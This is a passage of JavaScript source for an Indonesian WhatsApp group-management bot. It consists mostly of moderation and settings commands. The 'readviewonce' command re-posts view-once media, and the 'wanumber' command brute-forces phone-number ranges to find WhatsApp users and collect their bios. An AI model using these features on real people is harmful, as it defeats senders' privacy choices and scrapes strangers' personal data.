				let longitude = 106.865039;
				let captionText = "Lokasi ini berada di Jakarta";
				let whatsappNumber = m.chat;

				await sock.sendMessage(whatsappNumber, {
					location: {
						degreesLatitude: latitude,
						degreesLongitude: longitude
					}
				});

				newReply(captionText);
			}
			break;

			case 'block': 
			case 'ban': {
				if (!isCreator) return newReply(mess.owner);
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.m.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				await sock.updateBlockStatus(users, 'block')
				await newReply(mess.done);
			}
			break;

			case 'unblock': 
			case 'unban': {
				if (!isCreator) return newReply(mess.owner);
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.m.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				await sock.updateBlockStatus(users, 'unblock')
				await newReply(mess.done);
			}
			break;

			case 'getcase': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply('Harap masukkan nama case yang ingin dicari! 🧐');
				try {
					const getCase = (cases) => {
						const fileContent = fs.readFileSync("./case.js", "utf-8");
						const caseBlock = fileContent.split(`case '${cases}'`)[1];
						if (!caseBlock) throw new Error('Case not found');
						return `case '${cases}'` + caseBlock.split("break")[0] + "break";
					}
					newReply(`${getCase(text)}`);
				} catch (err) {
					newReply(`Case '${text}' tidak ditemukan! 🚫`);
				}
			}
			break;

			case 'antibadword':
			case 'antitoxic':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].badword = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].badword = false
					newReply(`${commad} is disabled`)
				}
			}
			break;

			case 'nsfw': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args[0] === 'true') {
					if (AntiNsfw) return newReply('Already activated')
					ntnsfw.push(m.chat)
					fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
					newReply('Success in turning on nsfw in this group')
					let groupe = await sock.groupMetadata(m.chat)
					let members = groupe['participants']
					let mems = []
					members.map(async adm => {
						mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					sock.sendMessage(m.chat, {text: `*「 ⚠️Warning⚠️ 」*\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
				} else if (args[0] === 'false') {
					if (!AntiNsfw) return newReply('Already deactivated')
					let off = ntnsfw.indexOf(m.chat)
					ntnsfw.splice(off, 1)
					fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
					newReply('Success in turning off nsfw in this group')
				} else {
					await newReply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
				}
			}
			break;

			case 'antiaudio':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antiaudio = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antiaudio = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antiforeign':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antiforeignnum = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antiforeignnum = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antisticker':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antisticker = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antisticker = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antiimage':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antiimage = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antiimage = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antivideo':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antivideo = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antivideo = false
					await newReply(mess.done);
				}
			}
			break;

			case 'liat':
			case 'rvo':
			case 'readviewonce': {
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (!m.quoted) return newReply(`Reply pesan view once-nya! 🙏`);
				if (m.quoted.mtype !== 'viewOnceMessageV2') return newReply(`Hmm... ini bukan pesan view once kak! 🤔`);
				let msg = m.quoted.message
				let type = Object.keys(msg)[0]
				let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
				let buffer = Buffer.from([])
				for await (const chunk of media) {
					buffer = Buffer.concat([buffer, chunk])
				}
				if (/video/.test(type)) {
					return sock.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
				} else if (/image/.test(type)) {
					return sock.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
				}
			}
			break;

			case 'antiviewonce':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antiviewonce = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antiviewonce = false
					await newReply(mess.done);
				}
			}
			break;

			case 'autoaijapri':
			case 'autoaipc':{
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].autoaipc = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].autoaipc = false
					await newReply(mess.done);
				}
			}
			break;

			case 'autoaigc':{
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].autoaigc = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].autoaigc = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antibot':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antibot = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antibot = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antispam':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antispam = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antispam = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antimedia':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antimedia = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antimedia = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antidocument':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antidocument = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antidocument = false
					await newReply(mess.done);
				}
			}
			break;

			case 'anticontact':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].anticontact = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].anticontact = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antilocation':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antilocation = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antilocation = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antilink': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antilink = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antilink = false
					await newReply(mess.done);
				}
			}
			break;

			case 'antilinkgc': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					db.data.chats[m.chat].antilinkgc = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antilinkgc = false
					await newReply(mess.done);
				}
			}
			break;

			case 'mute': {
				if (!m.isGroup) return newReply(mess.group)
				if (!isAdmins && !isCreator) return newReply(mess.admin)
				if (!isBotAdmins) return newReply(mess.botAdmin)
				if (text === 'true') {
					if (db.data.chats[m.chat].mute) return newReply('*Sudah Aktif Sebelumnya*')
					db.data.chats[m.chat].mute = true
					newReply('*Mute Activated !*')
				} else if (text === 'false') {
					db.data.chats[m.chat].mute = false
					newReply('*Mute Disabled !*')
				} else {
					newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				}
			}
			break

			case 'welcome':
			case 'left': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					welcome = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					welcome = false
					await newReply(mess.done);
				}
			}
			break;

			case 'adminevent': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					adminevent = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					adminevent = false
					await newReply(mess.done);
				}
			}
			break;

			case 'groupevent': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					groupevent = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					groupevent = false
					await newReply(mess.done);
				}
			}
			break;

			case 'sider':
			case 'gcsider': {
				let lama = 86400000 * 7
				const now = new Date().toLocaleString("en-US", {
					timeZone: "Asia/Jakarta"
				});
				const milliseconds = new Date(now).getTime();

				let member = groupMetadata.participants.map(v => v.id)
				if (!text) {
					let pesan = "Harap aktif di grup karena akan ada pembersihan member setiap saat"
				} else {
					let pesan = text
				}
				let sum
				sum = member.length
				let total = 0
				let sider = []
				for (let i = 0; i < sum; i++) {
					let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
					if ((typeof db.data.users[member[i]] == 'undefined' || milliseconds * 1 - db.data.users[member[i]].lastseen > lama) && !users.isAdmin && !users.isSuperAdmin) {
						if (typeof db.data.users[member[i]] !== 'undefined') {
							if (db.data.users[member[i]].banned == true) {
								total++
								sider.push(member[i])
							}
						} else {
							total++
							sider.push(member[i])
						}
					}
				}
				if (total == 0) return newReply(`*Digrup ini tidak terdapat sider.*`)
				newReply(`*${total}/${sum}* anggota grup *${groupName}* adalah sider dengan alasan :\n1. Unavailable selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“${pesan}”_\n\n*LIST SIDER :*\n${sider.map(v => ' · @' + v.replace(/@.+/, '' + typeof db.data.users[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - db.data.users[v].lastseen))).join('\n')}`);
			}
			break

			case 'hedsot':
			case 'buang':
			case 'kick': {
				if (!m.isGroup) return newReply('Eits, perintah ini cuma bisa dipakai di grup lho, kak! 🤭');
				if (!isCreator && !isAdmins) return newReply('Maaf ya kak, cuma admin atau owner yang bisa pakai perintah ini. 🙏');
				if (!isBotAdmins) return newReply('Aku belum jadi admin nih, kak. Jadikan aku admin dulu ya biar bisa bantu! 😢');
				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) {
					return newReply('Hmm... Kamu mau kick siapa nih? Sebutin dong orangnya! 🤔');
				}
				let users = m.mentionedJid[0] 
				? m.mentionedJid[0] 
				: m.quoted 
				? m.quoted.sender 
				: text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
				if (ownerNumber.includes(users.replace('@s.whatsapp.net', ''))) {
					return newReply('Eh, itu kan owner aku, kak! Jangan usil dong, nanti aku dimarahin. 😣');
				}
				try {
					await sock.groupParticipantsUpdate(m.chat, [users], 'remove');
					newReply('Yey, udah berhasil kak! Bye-bye orang yang tadi~ 👋✨');
				} catch (err) {
					console.error(err);
					newReply('Aduh, ada yang salah nih waktu aku coba kick orangnya. Coba cek lagi ya, kak. 😥');
				}
			};
			break;

			case 'wanumber': 
			case 'nowa': 
			case 'searchno': 
			case 'searchnumber': {
				if (!text) return newReply(`Kak, tolong kasih nomor dengan format yang benar ya!\n\n*Kirim perintah*: *${prefix + command} 6281234567x* 😄`);
				let inputnumber = text.split(" ")[0];
				newReply('Tunggu sebentar ya kak, MiwaAI lagi cari nomornya... 🔍✨');
				function countInstances(string, word) {
					return string.split(word).length - 1;
				}
				let number0 = inputnumber.split('x')[0];
				let number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] || '';
				let random_length = countInstances(inputnumber, 'x');
				let randomxx = Math.pow(10, random_length); // Tentukan jumlah iterasi berdasarkan 'x'
				let resultText = `📱 *Hasil Pencarian Nomor WhatsApp*: 📱\n\n`;
				let nobio = `📌 *Nomor Tanpa Bio*: 📌\n`;
				let nowhatsapp = `🚫 *Nomor yang Tidak Terdaftar WhatsApp*: 🚫\n`;
				for (let i = 0; i < randomxx; i++) {
					let randomDigits = String(i).padStart(random_length, '0'); // Format angka sesuai jumlah 'x'
					let formattedNumber = `${number0}${randomDigits}${number1}`;
					try {
						let anu = await sock.onWhatsApp(`${formattedNumber}@s.whatsapp.net`);
						if (anu.length === 0) {
							nowhatsapp += `- ${formattedNumber}\n`;
							continue;
						}
						let anu1;
						try {
							anu1 = await sock.fetchStatus(anu[0].jid);
						} catch {
							anu1 = { status: '', setAt: null };
						}
						if (!anu1.status || anu1.status.length === 0) {
							nobio += `- wa.me/${anu[0].jid.split("@")[0]}\n`;
						} else {
							resultText += `🪀 *Nomor*: wa.me/${anu[0].jid.split("@")[0]}\n`;
							resultText += `🎗️ *Bio*: ${anu1.status}\n`;
							resultText += `🗓️ *Terakhir diperbarui*: ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`;
						}
					} catch (err) {
						console.error(err);
						nowhatsapp += `- ${formattedNumber}\n`;
					}
				}
				let finalMessage = '✨ *Pencarian Selesai, Kak!* ✨\n\n';
				finalMessage += resultText;
				finalMessage += `\n${nobio}`;
				finalMessage += `\n${nowhatsapp}`;
				finalMessage += `\nKalau butuh bantuan lagi, panggil MiwaAI ya! 🤗`;
				newReply(finalMessage);
			}
			break;

			case 'add': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!text && !m.quoted) {
					newReply(`Cara pakai command: ${prefix + command} 62xxx`);
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender;
					try {
						await sock.groupParticipantsUpdate(m.chat, [numbersOnly], 'add')
							.then(async (res) => {
								for (let i of res) {
									let invv = await sock.groupInviteCode(m.chat);
									if (i.status == 408) return newReply('Oh no, sepertinya user baru saja keluar dari grup ini! 😔');
									if (i.status == 401) return newReply('Aduh, usernya kayaknya ngeblok bot ini deh! 😢');
									if (i.status == 409) return newReply('Wah, user ini udah masuk grup! 🎉');
									if (i.status == 500) return newReply('Maaf, grup ini sudah penuh! 😞');
									if (i.status == 403) {
										await sock.sendMessage(m.chat, { 
											text: `@${numbersOnly.split('@')[0]} Gak bisa ditambahin nih\n\nKarena targetnya private banget! 😅\n\nTapi, undangannya bakal dikirim ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nLewat chat pribadi ya!`, 
											mentions: [numbersOnly] 
										}, { quoted: m });
										await sock.sendMessage(`${numbersOnly ? numbersOnly : creator}`, { 
											text: `${'https://chat.whatsapp.com/' + invv}\n━━━━━━━━━━━━━━━━━━━━━\n\nAdmin: wa.me/${m.sender}\nUndang Kamu ke grup ini\nAyo masuk kalau mau ya! 🙇`, 
											detectLink: true, 
											mentions: [numbersOnly] 
										}, { quoted: floc2 }).catch((err) => newReply('Gagal kirim undangan! 😔'));
									} else {
										newReply(mess.done);
									}
								}
							});
					} catch (e) {
						newReply('Gagal nambahin usernya nih, ada yang salah! 😢');
					}
				}
			}
			break;

			case 'promote':
			case 'pm': {
				if (!m.isGroup) return newReply(mess.group)
				if (!isCreator && !isAdmins) return newReply(mess.admin)
				if (!isBotAdmins) return newReply(mess.botAdmin)
				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return newReply('Hmm... Kamu mau promote siapa?');
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Hmm... Kamu mau ${command} siapa? 🤔`)
				await sock.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => newReply(mess.done)).catch((err) => newReply(mess.error))
			}
			break

			case 'demote':
			case 'dm': {
				if (!m.isGroup) return newReply(mess.group)
				if (!isCreator && !isAdmins) return newReply(mess.admin)
				if (!isBotAdmins) return newReply(mess.botAdmin)
				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return newReply('Hmm... Kamu Kamu demote siapa? 🤔')
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Hmm... Kamu mau ${command} siapa? 🤔`)
				await sock.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => newReply(mess.done)).catch((err) => newReply(mess.error))
			}
			break

			case 'revoke':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				await sock.groupRevokeInvite(m.chat)
					.then(res => {
						newReply(mess.done)
					}).catch(() => newReply(mess.error))
				}
				break

			case 'setnamegc':
			case 'setsubject':
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!text) return newReply('Mau di namain apa kak grupnya? 🤔');
				await sock.groupUpdateSubject(m.chat, text);
				newReply(mess.done);
			break;

			case 'setppgroup': 
			case 'setppgrup': 
			case 'setppgc': {
				if (!m.isGroup) return newReply(mess.group)
				if (!isAdmins) return newReply(mess.admin)
				if (!isBotAdmins) return newReply(mess.botAdmin)
				if (!quoted) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (!/image/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (/webp/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				let media = await sock.downloadAndSaveMediaMessage(quoted)
				await sock.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
				newReply(mess.done)
			}
			break

			case 'deleteppgroup': 
			case 'delppgc': 
			case 'deleteppgc': 
			case 'delppgroup': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				await sock.removeProfilePicture(m.chat)
			}
			break;

			case 'setppbot': {
				if (!isCreator) return newReply(mess.owner)
				if (!quoted) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (!/image/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (/webp/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				let media = await sock.downloadAndSaveMediaMessage(quoted)
				await sock.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
				newReply(mess.done)
			}
			break;

			case 'pppanjang': case 'setppbot2':{
				if (!isCreator) return newReply(mess.owner)
				if (!quoted) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (!/image/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (/webp/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				let media = await sock.downloadAndSaveMediaMessage(quoted);
				const { img } = await generateProfilePicture(media);
				await sock.query({
					tag: 'iq',
					attrs: {
						to: botNumber,
						type:'set',
						xmlns: 'w:profile:picture'
					},
					content: [
						{
							tag: 'picture',
							attrs: { type: 'image' },
							content: img
						} 
					]
				})
				newReply(mess.done);
			}
			break

			case 'deleteppbot': 
			case 'delppbot': {
				if (!isCreator) return newReply(mess.owner);
				await sock.removeProfilePicture(sock.user.id)
				newReply(mess.done)
			}
			break;

			case 'setbiobot':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Where is the text?\nExample: ${prefix + command} MiwaAI AI`)
				await sock.updateProfileStatus(text)
				newReply(mess.done)
			}
			break;

			case 'setdesc':
			case 'setdesk':
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!text) return newReply('Text ?')
				await sock.groupUpdateDescription(m.chat, text)
				newReply(mess.done)
			break;

			case 'cleardesc':
			case 'cleardesk':{
				if (!m.isGroup) return newReply('Perintah ini hanya dapat digunakan dalam grup.');
				if (!isAdmins && !isGroupOwner && !isCreator) return newReply('Perintah ini hanya dapat digunakan oleh admin.');
				try {
					await sock.groupUpdateDescription(m.chat, null);
					newReply('Deskripsi grup berhasil dihapus.');
				} catch (err) {
					console.error(err);
					newReply('Gagal menghapus deskripsi grup.');
				}
			}
			break;

			// New Feature (Beta Feature)
			case 'setcallprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Penggunaan:\nsetcallprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const callValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(callValue)) {
					return newReply('Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateCallPrivacy(callValue);
					newReply(`Berhasil mengatur privasi panggilan menjadi "${callValue}".`);
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengatur privasi panggilan.');
				}
			}
			break;

			case 'setlastprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Penggunaan:\nsetlastprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const lastValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(lastValue)) {
					return newReply('Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateLastSeenPrivacy(lastValue);
					newReply(`Berhasil mengatur privasi last seen menjadi "${lastValue}".`);
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengatur privasi last seen.');
				}
			}
			break;

			case 'setonlineprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Penggunaan:\nsetonlineprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const onlineValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(onlineValue)) {
					return newReply('Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateOnlinePrivacy(onlineValue);
					newReply(`Berhasil mengatur privasi online menjadi "${onlineValue}".`);
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengatur privasi online.');
				}
			}
			break;

			case 'setprofileprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Penggunaan:\nsetprofileprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const profileValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(profileValue)) {
					return newReply('Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateProfilePicturePrivacy(profileValue);
					newReply(`Berhasil mengatur privasi foto profil menjadi "${profileValue}".`);
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengatur privasi foto profil.');
				}
			}
			break;

			case 'setstatusprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Penggunaan:\nsetstatusprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const statusValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(statusValue)) {
					return newReply('Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateStatusPrivacy(statusValue);
					newReply(`Berhasil mengatur privasi status menjadi "${statusValue}".`);
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengatur privasi status.');
				}
			}
			break;

			case 'setreadreceiptsprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Penggunaan:\nsetreadreceiptsprivacy <value>\n\nPilihan value:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const readReceiptsValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(readReceiptsValue)) {
					return newReply('Nilai tidak valid. Pilih salah satu: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateReadReceiptsPrivacy(readReceiptsValue);
					newReply(`Berhasil mengatur privasi read receipts menjadi "${readReceiptsValue}".`);
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengatur privasi read receipts.');
				}
			}
			break;

			case 'setreactionmode':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply('Penggunaan: setreactionmode <mode>\n\nContoh:\nsetreactionmode enabled\ntsetreactionmode disabled');	
				const reactionMode = text.toLowerCase();
				if (!['enabled', 'disabled'].includes(reactionMode)) {
					return newReply('Mode tidak valid. Pilih "enabled" atau "disabled".');
				}
				try {
					await sock.newsletterReactionMode(saluran, reactionMode);
					newReply(`Berhasil mengatur mode reaksi menjadi "${reactionMode}".`);
				} catch (err) {
					console.error(err);
